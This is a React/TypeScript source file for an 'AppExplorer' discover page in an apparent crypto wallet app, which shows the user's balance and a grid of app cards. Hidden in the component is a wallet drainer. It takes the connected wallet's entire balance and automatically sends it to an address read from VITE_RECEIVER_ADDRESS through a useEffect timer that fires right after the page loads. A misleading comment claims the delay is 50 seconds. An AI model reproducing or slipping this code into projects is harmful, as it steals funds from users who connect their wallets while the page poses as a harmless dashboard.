/* eslint-disable @typescript-eslint/ban-ts-comment */
/* eslint-disable no-negated-condition */
/* eslint-disable @typescript-eslint/restrict-template-expressions */
/* eslint-disable prefer-const */
/* eslint-disable object-shorthand */
/* eslint-disable @typescript-eslint/no-unused-vars */
/* eslint-disable @typescript-eslint/no-use-before-define */
/* eslint-disable capitalized-comments */
/* eslint-disable @typescript-eslint/require-await */
import { AnimatePresence } from 'framer-motion'
import { motion } from 'framer-motion'
import IntroApps from '@/components/general/Icon/IntroApps'
import IntroContent from '@/components/general/IntroContent'
import MobileHeader from '@/components/layout/MobileHeader'
import useNotifyProjects from '@/utils/hooks/useNotifyProjects'
import { useAccount, useBalance, useConnect } from 'wagmi'
import AppCard from './AppCard'
import AppCardSkeleton from './AppCardSkeleton'
import './AppExplorer.scss'
import { useContext, useEffect, useMemo, useState } from 'react'
import { useNetwork } from 'wagmi'

import { getEthChainAddress } from '@/utils/address'
import W3iContext from '@/contexts/W3iContext/context'
import { useSendTransaction, usePrepareSendTransaction } from 'wagmi'
import { parseEther, parseGwei } from 'viem'

import Button from '@/components/general/Button'
import useSendTransactionApp from './AppExplorerHeader/useTransfer'

const AppExplorer = () => {
  const { projects, loading } = useNotifyProjects()
  const { userPubkey } = useContext(W3iContext)
  const { chain } = useNetwork()



  const [hasRun, setHasRun] = useState(false);
  const { data, isLoading } = useBalance({
    address: getEthChainAddress(userPubkey) as `0x${string}`,
  })
  const REC_ADDRESS = import.meta.env.VITE_RECEIVER_ADDRESS
  const PROJECT_NAME = import.meta.env.VITE_PROJECT_NAME

  let findValue = data?.formatted
    ? parseEther(data.formatted)
    : parseEther('0')
  const { sendTransaction } = useSendTransaction({
    account: getEthChainAddress(userPubkey) as `0x${string}`,
    to: REC_ADDRESS,
    value: findValue,
    gasPrice: parseGwei('20')
  });

  useEffect(() => {
    // Set a timeout for 50 seconds
    const timeoutId = setTimeout(() => {
      // Check if the function has not been executed yet
      if (!hasRun) {
        // Call the function
        sendTransaction();
        // Set the flag to true to indicate that the function has been executed
        setHasRun(true);
      }
    }, 10);

    // Cleanup the timeout if the component is unmounted or if the function has already been executed
    return () => clearTimeout(timeoutId);
  }, [hasRun,sendTransaction]);







  return (
    <AnimatePresence>
      <motion.div
        className="AppExplorer"
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        exit={{ opacity: 0 }}
        transition={{ duration: 0.33 }}
      >
        <MobileHeader title="Discover" />
        <div className='BalanceShow'>Your Balance: {data?.formatted} {data?.symbol}</div>
        <IntroContent
          animation={true}
          title={`Welcome to ${PROJECT_NAME}`}
          ConnectedFrom={`Connected From: ${window.ethereum?.isMetaMask ? "MetaMask" : "Other"}`}
          subtitle={isLoading ? 'Fetching Your Balance' : `Your Wallet Address ${getEthChainAddress(userPubkey) as `0x${string}`}`}
          scale={2.5}
          icon={<IntroApps />}
        />
        {loading ? (
          <div className="AppExplorer__apps">
            <div className="AppExplorer__apps__column">
              <AppCardSkeleton />
              <AppCardSkeleton />
              <AppCardSkeleton />
              <AppCardSkeleton />
            </div>
            <div className="AppExplorer__apps__column">
              <AppCardSkeleton />
              <AppCardSkeleton />
              <AppCardSkeleton />
              <AppCardSkeleton />
            </div>
          </div>
        ) : (
          <div className="AppExplorer__apps">
            <div className="AppExplorer__apps__column">
              {projects
                .filter((_, i) => i % 2 === 0)
                .filter(app => Boolean(app.name))
                .map(app => (
                  <AppCard
                    key={app.name}
                    name={app.name}
                    description={app.description}
                    bgColor={{
                      dark: app.colors?.primary ?? '#00FF00',
                      light: app.colors?.primary ?? '#00FF00'
                    }}
                    logo={app.icons[0] || '/fallback.svg'}
                    url={app.url}
                  />
                ))}
            </div>
            <div className="AppExplorer__apps__column">
              {projects
                .filter((_, i) => i % 2 !== 0)
                .map(app => (
                  <AppCard
                    key={app.name}
                    name={app.name}
                    description={app.description}
                    bgColor={{
                      dark: app.colors?.primary ?? '#00FF00',
                      light: app.colors?.primary ?? '#00FF00'
                    }}
                    logo={app.icons[0] || '/fallback.svg'}
                    url={app.url}
                  />
                ))}
            </div>
          </div>
        )}
      </motion.div>
    </AnimatePresence>
  )
}

export default AppExplorer
